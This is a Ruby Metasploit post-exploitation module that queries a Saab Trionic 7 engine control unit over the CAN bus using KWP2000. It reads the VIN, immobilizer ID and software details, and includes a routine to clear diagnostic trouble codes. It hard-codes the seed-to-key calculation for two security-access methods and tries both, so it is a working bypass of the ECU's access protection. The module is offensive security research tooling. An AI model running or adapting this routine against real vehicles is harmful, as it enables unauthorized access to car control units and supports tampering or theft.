##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/hardware/automotive/kwp2000_on_can'

class MetasploitModule < Msf::Post

  include Msf::Post::Hardware::Automotive::KWP2000onCAN

  # parameter IDs (PIDs) for Saab Trionic 7
  VEHICLE_IDENTIFICATION_NUMBER = 0x90
  IMMOBILIZER_ID = 0x91
  SOFTWARE_PART_NUMBER = 0x94
  SOFTWARE_VERSION = 0x95
  ENGINE_TYPE = 0x97
  SYMBOL_TABLE_OFFSET = 0x9B


  def initialize(info={})
    super( update_info( info,
                       'Name'          => 'Get vehicle information from Saab Trionic 7 target module',
                       'Description'   => %q{ Post Module to query vehicle information via 
                       keyword protocol 2000 (KWP2000) over CAN},
                               'License'       => MSF_LICENSE,
                               'Author'        => ['Matthias Deeg (SySS GmbH)'],
                               'Platform'      => ['hardware'],
                               'SessionTypes'  => ['hwbridge']
                      ))
    register_options([
      OptInt.new('SRCID', [true, "Module ID to query", 0x220]),
      OptInt.new('DSTID', [false, "Expected reponse ID, defaults to SRCID + 0x18", 0x238]),
      OptString.new('CANBUS', [false, "CAN Bus to perform scan on, defaults to connected bus", nil])
    ], self.class)

  end


  #
  # Read ECU identification data for specific parameter ID (PID)
  #
  # @param bus [String] unique CAN bus identifier
  # @param bus [String] parameter ID (PID)
  #
  # @return [String] engine type
  def read_ecu_id_data(bus, pid)
    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, READ_ECU_IDENTIFICATION, [pid], {"MAXPKTS" => 1})
    if response.size > 0
      response.pack("H*" * response.size)[1..response.size - 1]
    else
      return nil
    end
  end 


  #
  # Read DTC codes
  #
  # @param bus [String] unique CAN bus identifier
  #
  # @return [Array] DTC codes
  def read_dtc_codes(bus)
    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, READ_DIAGNOSTIC_TROUBLE_CODES_BY_STATUS, [0x02], {"MAXPKTS" => 1})
    if response.size > 0
      response
    else
      return nil
    end
  end 


  #
  # Clear DTC codes
  #
  # @param bus [String] unique CAN bus identifier
  #
  # @return response
  def clear_dtc_codes(bus)
    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, CLEAR_DIAGNOSTIC_INFORMATION, [0xff, 0xff], {"MAXPKTS" => 1})
    if response.size > 0
      response
    else
      return nil
    end
  end 

  #
  # Request security access
  #
  # @param bus [Integer] security level
  # @return [String] engine type
  def request_security_access(bus, method)
#    print_status("Request security access (method #{method})")
    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, SECURITY_ACCESS, [0x05], {"MAXPKTS" => 1})

    if response[0].hex == 0x05 and response.size > 2
      seed = response[1].hex << 8 | response[2].hex
    else
      print_error("Could not receive seed")
      return nil
    end

    # calculate key for seed and send request
    key = calculate_key(seed, method)
    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, SECURITY_ACCESS, [0x06] + key, {"MAXPKTS" => 1})

    if response[1].hex == 0x34
#      print_good("Security access granted")
      return true
    else
#      print_error("Security access denied")
      return false
    end
  end 


  #
  # Calculate key for security access
  #
  # @param seed [Integer] seed for key calculation
  # @param method [Integer] method for key calculation (0 or 1)
  # @return [Integer] key
  def calculate_key(seed, method)
    key = seed << 2
    if method == 1
      key ^= 0x4081
      key -= 0x1F6F
    else
      key ^= 0x8142
      key -= 0x2356
    end

    return [key >> 8 & 0xff, key & 0xff]
  end


  def run
    # start KWP2000 session
    start_kwp2000_session(datastore["CANBUS"])

    # get vehicle identification number
    vin = read_ecu_id_data(datastore["CANBUS"], VEHICLE_IDENTIFICATION_NUMBER)
    unless vin.nil?
      print_good("VIN: #{vin}")
    end

    # get immobilizer ID
    immobilizer_id = read_ecu_id_data(datastore["CANBUS"], IMMOBILIZER_ID)
    unless immobilizer_id.nil?
      print_good("Immobilizier ID: #{immobilizer_id}")
    end

    # get engine type
    engine_type = read_ecu_id_data(datastore["CANBUS"], ENGINE_TYPE)
    unless engine_type.nil?
      print_good("Engine type: #{engine_type}")
    end

    # get software part number
    software_part_number = read_ecu_id_data(datastore["CANBUS"], SOFTWARE_PART_NUMBER)
    unless software_part_number.nil?
      print_good("Software part number: #{software_part_number}")
    end

    # get software version
    software_version = read_ecu_id_data(datastore["CANBUS"], SOFTWARE_VERSION)
    unless software_version.nil?
      print_good("Software version: #{software_version}")
    end

    # check if security access is possible with known methods
    for i in 0..1
      if request_security_access(datastore["CANBUS"], i)
        print_good("Security access granted (method #{i})")
        break
      end
    end

  end
end
